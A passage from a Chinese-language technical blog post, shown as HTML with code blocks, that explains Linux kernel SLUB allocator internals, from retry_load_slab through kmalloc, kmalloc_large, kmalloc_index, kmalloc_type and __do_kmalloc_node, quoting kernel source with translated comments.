class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c">check_new_slab:<br><br><span class="hljs-keyword">if</span> (kmem_cache_debug(s)) &#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * For debug caches here we had to go through</span><br><span class="hljs-comment"> * alloc_single_from_partial() so just store the tracking info</span><br><span class="hljs-comment"> * and return the object</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (s-&gt;flags &amp; SLAB_STORE_USER)<br>set_track(s, freelist, TRACK_ALLOC, addr);<br><br><span class="hljs-keyword">return</span> freelist;<br>&#125;<br><br><span class="hljs-keyword">if</span> (unlikely(!pfmemalloc_match(slab, gfpflags))) &#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * For !pfmemalloc_match() case we don&#x27;t load freelist so that</span><br><span class="hljs-comment"> * we don&#x27;t make further mismatched allocations easier.</span><br><span class="hljs-comment"> */</span><br>deactivate_slab(s, slab, get_freepointer(s, freelist));<br><span class="hljs-keyword">return</span> freelist;<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="⑦-retry-load-slab："><a href="#⑦-retry-load-slab：" class="headerlink" title="⑦ retry_load_slab："></a>⑦ retry_load_slab：</h4><p>最后就是尝试加载新获得的 slab，如果 percpu slab 不为 NULL 则使其不再活动，并设置 percpu slab &amp; freelist 为 NULL，并获取下一个 tid</p><p>最后就是将 percpu slab 设为新获取的 slab 并跳转回 <code>load_freelist</code> 分配对象并返回</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c">retry_load_slab:<br><br>local_lock_irqsave(&amp;s-&gt;cpu_slab-&gt;lock, flags);<br><span class="hljs-keyword">if</span> (unlikely(c-&gt;slab)) &#123;<br><span class="hljs-type">void</span> *flush_freelist = c-&gt;freelist;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">slab</span> *<span class="hljs-title">flush_slab</span> =</span> c-&gt;slab;<br><br>c-&gt;slab = <span class="hljs-literal">NULL</span>;<br>c-&gt;freelist = <span class="hljs-literal">NULL</span>;<br>c-&gt;tid = next_tid(c-&gt;tid);<br><br>local_unlock_irqrestore(&amp;s-&gt;cpu_slab-&gt;lock, flags);<br><br>deactivate_slab(s, flush_slab, flush_freelist);<br><br>stat(s, CPUSLAB_FLUSH);<br><br><span class="hljs-keyword">goto</span> retry_load_slab;<br>&#125;<br>c-&gt;slab = slab;<br><br><span class="hljs-keyword">goto</span> load_freelist;<br>&#125;<br></code></pre></td></tr></table></figure><p>至此， slub 分配算法的核心逻辑分析结束</p><h2 id="二、kmalloc：-NUMA-NO-NODE-的通用上层分配接口"><a href="#二、kmalloc：-NUMA-NO-NODE-的通用上层分配接口" class="headerlink" title="二、kmalloc： NUMA_NO_NODE 的通用上层分配接口"></a>二、kmalloc： NUMA_NO_NODE 的通用上层分配接口</h2><p>我们日常生活中（？）最常用的其实还是 <code>kmalloc()</code>，其会根据分配的大小与标志位帮我们完成 <code>kmem_cache</code> 的选取并进行对象分配</p><p>函数整体逻辑比较简单：</p><ul><li>若分配的大小在编译期已知（<code>__builtin_constant_p()</code>）则判断大小：<ul><li>若大小大于 <code>KMALLOC_MAX_CACHE_SIZE</code> 则使用 <code>kmalloc_large()</code> 进行分配</li><li>通过 <code>kmalloc_index()</code> 与 <code>kmalloc_type()</code> 获取 <code>kmalloc_caches</code> 中对应的数组下标并调用 <code>kmalloc_trace</code> 进行对象分配</li></ul></li><li>若大小是动态传入的，调用 <code>__kmalloc()</code> 进行分配</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * kmalloc - 分配内核内存</span><br><span class="hljs-comment"> * @size: 需要的内存字节数.</span><br><span class="hljs-comment"> * @flags: 描述分配上下文</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * kmalloc 是内核中分配小于页面大小的内存对象的通用方法.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 被分配的对象地址至少要对齐到 ARCH_KMALLOC_MINALIGN 字节.</span><br><span class="hljs-comment"> * 对于 2^n 字节的 @size , 对齐也需要保证至少到该大小.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * @flags argument 可能是 include/linux/gfp.h 中定义的GFP 标志位，描述于</span><br><span class="hljs-comment"> * :ref:`Documentation/core-api/mm-api.rst &lt;mm-api-gfp-flags&gt;`</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 推荐的对 @flags 使用描述于</span><br><span class="hljs-comment"> * :ref:`Documentation/core-api/memory-allocation.rst &lt;memory_allocation&gt;`</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 以下为最常用的 GFP 标志位简要概述</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * %GFP_KERNEL</span><br><span class="hljs-comment"> *分配普通内核内存. 可能睡眠.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * %GFP_NOWAIT</span><br><span class="hljs-comment"> *分配将不会睡眠.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * %GFP_ATOMIC</span><br><span class="hljs-comment"> *分配将不会睡眠.  可能使用 emergency pools.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 也可以通过异或以下的一个或多个额外@flags来设置不同的标志位:</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * %__GFP_ZERO</span><br><span class="hljs-comment"> *在返回前清零分配的内存. 也可参见 kzalloc().</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * %__GFP_HIGH</span><br><span class="hljs-comment"> *这个分配有着高优先级且可能使用 emergency pools.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * %__GFP_NOFAIL</span><br><span class="hljs-comment"> *表示此次分配不允许失败</span><br><span class="hljs-comment"> *(在使用前再次思考).</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * %__GFP_NORETRY</span><br><span class="hljs-comment"> *若内存不会马上可用,立即放弃.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * %__GFP_NOWARN</span><br><span class="hljs-comment"> *若分配失败，不要提交警告.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * %__GFP_RETRY_MAYFAIL</span><br><span class="hljs-comment"> *努力尝试使分配成功，但最终失败.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> CONFIG_SLOB</span><br><span class="hljs-type">static</span> __always_inline __alloc_size(<span class="hljs-number">1</span>) <span class="hljs-type">void</span> *<span class="hljs-title function_">kmalloc</span><span class="hljs-params">(<span class="hljs-type">size_t</span> size, <span class="hljs-type">gfp_t</span> flags)</span><br>&#123;<br><span class="hljs-keyword">if</span> (__builtin_constant_p(size) &amp;&amp; size) &#123;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> index;<br><br><span class="hljs-keyword">if</span> (size &gt; KMALLOC_MAX_CACHE_SIZE)<br><span class="hljs-keyword">return</span> kmalloc_large(size, flags);<br><br>index = kmalloc_index(size);<br><span class="hljs-keyword">return</span> kmalloc_trace(<br>kmalloc_caches[kmalloc_type(flags)][index],<br>flags, size);<br>&#125;<br><span class="hljs-keyword">return</span> __kmalloc(size, flags);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="I-kmalloc-large-：直接向-buddy-system-请求内存"><a href="#I-kmalloc-large-：直接向-buddy-system-请求内存" class="headerlink" title="I. kmalloc_large()：直接向 buddy system 请求内存"></a>I. kmalloc_large()：直接向 buddy system 请求内存</h3><p>对于请求大小大于 <code>KMALLOC_MAX_CACHE_SIZE</code> 的内存分配请求而言， <code>kmalloc()</code> 会直接调用 <code>kmalloc_large()</code> 完成内存分配，最后实际上会在 <code>__kmalloc_large_node()</code> 调用 <code>alloc_pages()</code> 向 buddy system 请求内存：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 为了避免不必要的开销,我们将大的分配请求直接传递给页面分配器.</span><br><span class="hljs-comment"> * 我们使用 __GFP_COMP, 因为我们需要知道分配的 order 以在 kfree 中恰当地释放.</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> *__kmalloc_large_node(<span class="hljs-type">size_t</span> size, <span class="hljs-type">gfp_t</span> flags, <span class="hljs-type">int</span> node)<br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span>;</span><br><span class="hljs-type">void</span> *ptr = <span class="hljs-literal">NULL</span>;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> order = get_order(size);<br><br><span class="hljs-keyword">if</span> (unlikely(flags &amp; GFP_SLAB_BUG_MASK))<br>flags = kmalloc_fix_flags(flags);<br><br>flags |= __GFP_COMP;<br>page = alloc_pages_node(node, flags, order);<br><span class="hljs-keyword">if</span> (page) &#123;<br>ptr = page_address(page);<br>mod_lruvec_page_state(page, NR_SLAB_UNRECLAIMABLE_B,<br>      PAGE_SIZE &lt;&lt; order);<br>&#125;<br><br>ptr = kasan_kmalloc_large(ptr, size, flags);<br><span class="hljs-comment">/* As ptr might get tagged, call kmemleak hook after KASAN. */</span><br>kmemleak_alloc(ptr, size, <span class="hljs-number">1</span>, flags);<br>kmsan_kmalloc_large(ptr, size, flags);<br><br><span class="hljs-keyword">return</span> ptr;<br>&#125;<br><br><span class="hljs-type">void</span> *<span class="hljs-title function_">kmalloc_large</span><span class="hljs-params">(<span class="hljs-type">size_t</span> size, <span class="hljs-type">gfp_t</span> flags)</span><br>&#123;<br><span class="hljs-type">void</span> *ret = __kmalloc_large_node(size, flags, NUMA_NO_NODE);<br><br>trace_kmalloc(_RET_IP_, ret, size, PAGE_SIZE &lt;&lt; get_order(size),<br>      flags, NUMA_NO_NODE);<br><span class="hljs-keyword">return</span> ret;<br>&#125;<br>EXPORT_SYMBOL(kmalloc_large);<br></code></pre></td></tr></table></figure><h3 id="II-kmalloc-index-：获取size对应下标"><a href="#II-kmalloc-index-：获取size对应下标" class="headerlink" title="II. __kmalloc_index()：获取size对应下标"></a>II. __kmalloc_index()：获取size对应下标</h3><p><code>kmalloc_index()</code> 其实就是 <code>__kmalloc_index（）</code>，根据请求的大小返回对应的下标，整体逻辑非常简单粗暴：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 算出一个特定大小的分配属于哪个 kmalloc slab .</span><br><span class="hljs-comment"> * 0 = zero alloc</span><br><span class="hljs-comment"> * 1 =  65 .. 96 bytes</span><br><span class="hljs-comment"> * 2 = 129 .. 192 bytes</span><br><span class="hljs-comment"> * n = 2^(n-1)+1 .. 2^n</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 注意: __kmalloc_index() 在编译期优化, 没有运行时优化;</span><br><span class="hljs-comment"> * 典型的用法为通过 kmalloc_index() 以在编译期优化.</span><br><span class="hljs-comment"> * 大小非常量的调用者仅应当为__kmalloc_index()的运行时开销可以被接受的测试模块.</span><br><span class="hljs-comment"> * 同样参见 kmalloc_slab().</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> __always_inline <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> __kmalloc_index(<span class="hljs-type">size_t</span> size,<br>    <span class="hljs-type">bool</span> size_is_constant)<br>&#123;<br><span class="hljs-keyword">if</span> (!size)<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br><span class="hljs-keyword">if</span> (size &lt;= KMALLOC_MIN_SIZE)<br><span class="hljs-keyword">return</span> KMALLOC_SHIFT_LOW;<br><br><span class="hljs-keyword">if</span> (KMALLOC_MIN_SIZE &lt;= <span class="hljs-number">32</span> &amp;&amp; size &gt; <span class="hljs-number">64</span> &amp;&amp; size &lt;= <span class="hljs-number">96</span>)<br><span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br><span class="hljs-keyword">if</span> (KMALLOC_MIN_SIZE &lt;= <span class="hljs-number">64</span> &amp;&amp; size &gt; <span class="hljs-number">128</span> &amp;&amp; size &lt;= <span class="hljs-number">192</span>)<br><span class="hljs-keyword">return</span> <span class="hljs-number">2</span>;<br><span class="hljs-keyword">if</span> (size &lt;=          <span class="hljs-number">8</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">3</span>;<br><span class="hljs-keyword">if</span> (size &lt;=         <span class="hljs-number">16</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">4</span>;<br><span class="hljs-keyword">if</span> (size &lt;=         <span class="hljs-number">32</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">5</span>;<br><span class="hljs-keyword">if</span> (size &lt;=         <span class="hljs-number">64</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">6</span>;<br><span class="hljs-keyword">if</span> (size &lt;=        <span class="hljs-number">128</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">7</span>;<br><span class="hljs-keyword">if</span> (size &lt;=        <span class="hljs-number">256</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">8</span>;<br><span class="hljs-keyword">if</span> (size &lt;=        <span class="hljs-number">512</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">9</span>;<br><span class="hljs-keyword">if</span> (size &lt;=       <span class="hljs-number">1024</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">10</span>;<br><span class="hljs-keyword">if</span> (size &lt;=   <span class="hljs-number">2</span> * <span class="hljs-number">1024</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">11</span>;<br><span class="hljs-keyword">if</span> (size &lt;=   <span class="hljs-number">4</span> * <span class="hljs-number">1024</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">12</span>;<br><span class="hljs-keyword">if</span> (size &lt;=   <span class="hljs-number">8</span> * <span class="hljs-number">1024</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">13</span>;<br><span class="hljs-keyword">if</span> (size &lt;=  <span class="hljs-number">16</span> * <span class="hljs-number">1024</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">14</span>;<br><span class="hljs-keyword">if</span> (size &lt;=  <span class="hljs-number">32</span> * <span class="hljs-number">1024</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">15</span>;<br><span class="hljs-keyword">if</span> (size &lt;=  <span class="hljs-number">64</span> * <span class="hljs-number">1024</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">16</span>;<br><span class="hljs-keyword">if</span> (size &lt;= <span class="hljs-number">128</span> * <span class="hljs-number">1024</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">17</span>;<br><span class="hljs-keyword">if</span> (size &lt;= <span class="hljs-number">256</span> * <span class="hljs-number">1024</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">18</span>;<br><span class="hljs-keyword">if</span> (size &lt;= <span class="hljs-number">512</span> * <span class="hljs-number">1024</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">19</span>;<br><span class="hljs-keyword">if</span> (size &lt;= <span class="hljs-number">1024</span> * <span class="hljs-number">1024</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">20</span>;<br><span class="hljs-keyword">if</span> (size &lt;=  <span class="hljs-number">2</span> * <span class="hljs-number">1024</span> * <span class="hljs-number">1024</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">21</span>;<br><br><span class="hljs-keyword">if</span> (!IS_ENABLED(CONFIG_PROFILE_ALL_BRANCHES) &amp;&amp; size_is_constant)<br>BUILD_BUG_ON_MSG(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;unexpected size in kmalloc_index()&quot;</span>);<br><span class="hljs-keyword">else</span><br>BUG();<br><br><span class="hljs-comment">/* Will never be reached. Needed because the compiler may complain */</span><br><span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="III-kmalloc-types-：获取标志位对应类型"><a href="#III-kmalloc-types-：获取标志位对应类型" class="headerlink" title="III. kmalloc_types()：获取标志位对应类型"></a>III. kmalloc_types()：获取标志位对应类型</h3><p><code>kmalloc_type()</code> 其实主要就是根据标志位返回类型，除了指定了 <code>__GFP_DMA/__GFP_RECLAIMABLE/__GFP_ACCOUNT</code> 以外就都是 <code>KMALLOC_NORMAL</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> __always_inline <span class="hljs-keyword">enum</span> kmalloc_cache_type <span class="hljs-title function_">kmalloc_type</span><span class="hljs-params">(<span class="hljs-type">gfp_t</span> flags)</span><br>&#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 最常规的情况为 KMALLOC_NORMAL, 所以用一个单独的分支测试所有相关的标志位.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (likely((flags &amp; KMALLOC_NOT_NORMAL_BITS) == <span class="hljs-number">0</span>))<br><span class="hljs-keyword">return</span> KMALLOC_NORMAL;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 至少需要设置一种标志位. 优先顺序为:</span><br><span class="hljs-comment"> *  1) __GFP_DMA</span><br><span class="hljs-comment"> *  2) __GFP_RECLAIMABLE</span><br><span class="hljs-comment"> *  3) __GFP_ACCOUNT</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (IS_ENABLED(CONFIG_ZONE_DMA) &amp;&amp; (flags &amp; __GFP_DMA))<br><span class="hljs-keyword">return</span> KMALLOC_DMA;<br><span class="hljs-keyword">if</span> (!IS_ENABLED(CONFIG_MEMCG_KMEM) || (flags &amp; __GFP_RECLAIMABLE))<br><span class="hljs-keyword">return</span> KMALLOC_RECLAIM;<br><span class="hljs-keyword">else</span><br><span class="hljs-keyword">return</span> KMALLOC_CGROUP;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="IV-kmalloc-trace-：常规大小的-NUMA-NO-NODE-对象分配"><a href="#IV-kmalloc-trace-：常规大小的-NUMA-NO-NODE-对象分配" class="headerlink" title="IV. kmalloc_trace()：常规大小的 NUMA_NO_NODE 对象分配"></a>IV. kmalloc_trace()：常规大小的 NUMA_NO_NODE 对象分配</h3><p><code>kmalloc_trace()</code> 主要是对 <code>__kmem_cache_alloc_node()</code> 的 wrapper，加上 tracepoint 和 kasan 的相关设置，需要注意的是这里会指定 node 为 <code>NUMA_NO_NODE</code>：</p><blockquote><p>不知道什么是 kernel trace point 的可以参见 <a href="https://docs.kernel.org/trace/tracepoints.html">这里</a></p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> *<span class="hljs-title function_">kmalloc_trace</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> kmem_cache *s, <span class="hljs-type">gfp_t</span> gfpflags, <span class="hljs-type">size_t</span> size)</span><br>&#123;<br><span class="hljs-type">void</span> *ret = __kmem_cache_alloc_node(s, gfpflags, NUMA_NO_NODE,<br>    size, _RET_IP_);<br><br>trace_kmalloc(_RET_IP_, ret, size, s-&gt;size, gfpflags, NUMA_NO_NODE);<br><br>ret = kasan_kmalloc(s, ret, size, gfpflags);<br><span class="hljs-keyword">return</span> ret;<br>&#125;<br>EXPORT_SYMBOL(kmalloc_trace);<br></code></pre></td></tr></table></figure><p><code>__kmem_cache_alloc_node()</code> 其实就是 <code>slab_alloc_node()</code> 的 wrapper：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> *__kmem_cache_alloc_node(<span class="hljs-keyword">struct</span> kmem_cache *s, <span class="hljs-type">gfp_t</span> gfpflags,<br>      <span class="hljs-type">int</span> node, <span class="hljs-type">size_t</span> orig_size,<br>      <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> caller)<br>&#123;<br><span class="hljs-keyword">return</span> slab_alloc_node(s, <span class="hljs-literal">NULL</span>, gfpflags, node,<br>       caller, orig_size);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="V-kmalloc-：常规大小的-NUMA-NO-NODE-对象分配"><a href="#V-kmalloc-：常规大小的-NUMA-NO-NODE-对象分配" class="headerlink" title="V. __kmalloc()：常规大小的 NUMA_NO_NODE 对象分配"></a>V. __kmalloc()：常规大小的 NUMA_NO_NODE 对象分配</h3><p><code>__kmalloc()</code> 其实就是指定 node 为 <code> NUMA_NO_NODE</code> 的 <code>__do_kmalloc_node()</code> ：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> *__kmalloc(<span class="hljs-type">size_t</span> size, <span class="hljs-type">gfp_t</span> flags)<br>&#123;<br><span class="hljs-keyword">return</span> __do_kmalloc_node(size, flags, NUMA_NO_NODE, _RET_IP_);<br>&#125;<br>EXPORT_SYMBOL(__kmalloc);<br></code></pre></td></tr></table></figure><h3 id="VI-do-kmalloc-node-：判断所需-kmem-cache-并进行对象分配"><a href="#VI-do-kmalloc-node-：判断所需-kmem-cache-并进行对象分配" class="headerlink" title="VI. __do_kmalloc_node()：判断所需 kmem_cache 并进行对象分配"></a>VI. __do_kmalloc_node()：判断所需 kmem_cache 并进行对象分配</h3><p>该函数的主要逻辑为：</p><ul><li>若 <code>size &gt; KMALLOC_MAX_CACHE_SIZE</code> ，则调用 <code>__kmalloc_large_node()</code> 进行分配，并进行 tracepoint 与 kasan 相关设置</li><li>对于常规 size：<ul><li>首先调用 <code>kmalloc_slab()</code> 获取对应的 <code>kmem_cache</code></li><li>接下来调用 <code>__kmem_cache_alloc_node()</code> 进行内存分配</li><li>最后进行 tracepoint 与 kasan 相关设置</li></ul></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> __always_inline<br><span class="hljs-type">void</span> *__do_kmalloc_node(<span class="hljs-type">size_t</span> size, <span class="hljs-type">gfp_t</span> flags, <span class="hljs-type">int</span> node, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> caller)<br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache</span> *<span class="hljs-title">s</span>;</span><br><span class="hljs-type">void</span> *ret;<br><br><span class="hljs-keyword">if</span> (unlikely(size &gt; KMALLOC_MAX_CACHE_SIZE)) &#123;<br>ret = __kmalloc_large_node(size, flags, node);<br>trace_kmalloc(caller, ret, size,<br>      PAGE_SIZE &lt;&lt; get_order(size), flags, node);<br><span class="hljs-keyword">return</span> ret;<br>&#125;<br><br>s = kmalloc_slab(size, flags);<br><br><span class="hljs-keyword">if</span> (unlikely(ZERO_OR_NULL_PTR(s)))<br><span class="hljs-keyword">return</span> s;<br><br>ret = __kmem_cache_alloc_node(s, flags, node, size, caller);<br>ret = kasan_kmalloc(s, ret, size, flags);<br>trace_kmalloc(caller, ret, size, s-&gt;size, flags, node);<br><span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>kmalloc_slab()</code> 中寻找 <code>kmem_cache</code> 的过程和 kmalloc 类似，不过寻找下标用的是 <code>size_index[size_index_elem(size)]</code> 和 <code>fls()</code> ：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 寻找满足给定大小的分配的 kmem_cache 